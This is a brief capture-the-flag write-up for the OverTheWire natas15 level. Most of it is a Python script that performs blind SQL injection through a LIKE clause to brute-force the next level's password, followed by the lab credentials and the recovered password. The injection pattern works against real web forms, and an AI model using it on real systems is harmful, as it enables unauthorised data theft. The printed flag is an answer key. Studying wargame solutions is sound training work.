@@ -1,0 +1,25 @@
+It have been more complicated than the previous ones, but here I am with the solution.
+In order to exploit this form I need to exploit the LIKE command of SQL queries.
+In that sense I wrote a python script that takes each posible letter character and start triying one by one.
+Python code here:
+import requests
+from string import *
+
+characters = ascii_lowercase + ascii_uppercase + digits
+base_username = "natas15"
+base_password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
+url = "http://natas15.natas.labs.overthewire.org/"
+password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
+
+while len(password) < 32:
+    for char in characters:
+        response = requests.post(url,
+                                 data={"username": 'natas16" AND binary password like "' + password + char + '%%" # '},
+                                 auth=(base_username, base_password))
+        content = response.text
+        if 'This user exists' in content:
+            password += char
+            print(password)
+            break
+At the end I obtained the key.
+hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
